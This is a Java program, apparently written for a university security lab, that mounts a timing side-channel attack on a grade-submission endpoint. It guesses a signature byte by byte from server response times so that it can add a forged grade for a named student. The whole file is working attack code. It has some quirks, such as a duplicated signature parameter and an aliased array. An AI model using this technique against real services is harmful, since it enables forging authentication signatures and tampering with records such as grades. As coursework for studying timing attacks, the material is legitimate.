package main;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public class GradeHack {

	public GradeHack(String name, String grade) {
		byte[] signature = new byte[10];
		
		
		
		try {
			
			
			
			for (int j = 0; j < 10; j++) {
				byte realValue = (byte) 0;
				long longestResponse = 0;
				//Make first connection so all after this one are "equal"
				String url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?";
				url += "name=" + name + "&grade=" + grade + "&signature=00000000000000000000";
				URL u2 = new URL(url);
				System.out.println("URL: " + url);

				URLConnection uc2 = u2.openConnection();
				for (int i = 0; i < 256; i++) {
					
					byte testValue = (byte) i;
					byte[] tempsig = signature;
					tempsig[j] = testValue;
					
					
					String sig = printByteArray(tempsig);
					
					String urlTest = url + "&signature=" + sig;
					URL u = new URL(urlTest);
					System.out.println("URL: " + urlTest);
					long startTime = System.nanoTime();
					URLConnection uc = u.openConnection();
					BufferedReader br = new BufferedReader(
							new InputStreamReader(uc.getInputStream(), "UTF-8"));
					String line;
					while ((line = br.readLine()) != null) {
						System.out.println("Read: " + line);
						if(line.equals("1")) {
							System.out.println();
						}
					}
					long responseTime = System.nanoTime() - startTime;
					if(responseTime > longestResponse && i != 0) {
						longestResponse = responseTime;
						realValue = testValue;
						//signature = tempsig;
					}
				}
				signature[j] = realValue;
			}
			System.out.println("Signaturen: ");
			printByteArray(signature);
			// StringSelection urlToClipboard = new StringSelection(url);
			// Clipboard clipboard = Toolkit.getDefaultToolkit()
			// .getSystemClipboard();
			// clipboard.setContents(urlToClipboard, urlToClipboard);

		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	private String printByteArray(byte[] array) {
		String s = "";
		for (int i = 0; i < array.length; i++) {
			s += String.format("%02x", array[i]);

		}
		System.out.println(s + " " + array.length + " bytes ");
		return s;
	}

	public static void main(String[] args) {
		GradeHack gh = new GradeHack("Kalle", "5");
	}
}
